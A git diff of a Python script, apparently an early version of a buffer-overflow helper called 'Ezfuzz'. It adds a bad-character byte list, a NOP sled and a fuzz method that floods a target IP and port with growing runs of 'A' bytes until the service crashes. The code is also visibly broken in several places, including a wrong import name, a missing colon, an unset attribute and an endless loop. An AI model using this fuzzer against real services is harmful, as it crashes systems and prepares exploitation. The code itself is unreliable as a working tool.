@@ -1,12 +1,10 @@
 #!/usr/bin/env python3
 
-
 try:
 	import subprocess as sp
 	import sockets
 except ImportError as err:
 	print(f"Import Error: {err}")
-  
   
 # -------------------Ansicolors
 rst = "\033[0m"
@@ -15,8 +13,8 @@ r = "\033[91m"
 g = "\033[92m"
 b = "\033[94m"
 
-# -------------------Bad Characters
-badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+# -------------------Characters
+chars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
 "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
 "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
 "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
@@ -27,22 +25,25 @@ badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x1
 
 # -------------------Ezfuzz
 class Ezfuzz:
-	""""""
+	"""
+	"""
 	def __init__(self):
-		self._targ_ip = None
+		self._targ_IP = None
 		self._targ_port = None
 		self._bad_chars_found = []
 		self._nop_sled = "\x90"*16
 		self._offset = None
 		self._num_bytes_crash
+		self._receive_bytes = 1024
 
-	@prorperty
+	@property
 	def bad_chars(self):
 		"""The bad characters found by user."""
 		return self._bad_chars_found
 	
 	@property
 	def num_bytes_crash(self)
+		""""""
 		return self._num_bytes_crash
 	
 	@num_bytes_crash.setter
@@ -51,14 +52,46 @@ class Ezfuzz:
 		
 	@property
 	def offset(self):
+		""""""
 		return self._offset
 	
-	def fuzz(self, targ_ip, targ_port):
-		""""""
-		self._targ_ip = targ_ip
+	def fuzz(self, targ_IP, targ_port):
+		"""Sends an incrementing number of bytes to an application
+		until it crashes or returns an error and then prints out the
+		number of bytes at the moment of the crash/error.
+
+		Params
+		------
+		targ_IP (str): The target's IP address.
+		targ_port (int): The target's port number.
+		"""
+		try:
+			if not isinstance(targ_IP, str):
+				raise TypeError(r + "The target IP address must be a string." + rst)
+			if not isinstance(targ_port, int):
+				raise TypeError(r + "The target port number must be an integer between 1-65535" + rst)
+		except TypeError as err:
+			print(f"Error: {err}")
+
+		self._targ_IP = targ_IP
 		self._targ_port = targ_port
-		
-		return self._num_bytes_crash
+			
+		self._num_bytes_crash = 50
+		while True:
+			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
+				try:
+					soc.connect((self._targ_IP, self._targ_port))
+					self._buffer = 'A'*self._num_bytes_crash
+					while True:
+						soc.recv(self._receive_bytes)
+						soc.send("Test\r\n")
+						soc.recv(self._receive_bytes)
+						soc.send(self._buffer)
+				except:
+					print(f"Number of bytes sent at crash: {self._num_bytes_crash}")
+					self._num_bytes_crash -= 50
+				finally:
+					self._num_bytes_crash += 50
 	
 	def send_msf_pattern(self):
 		""""""
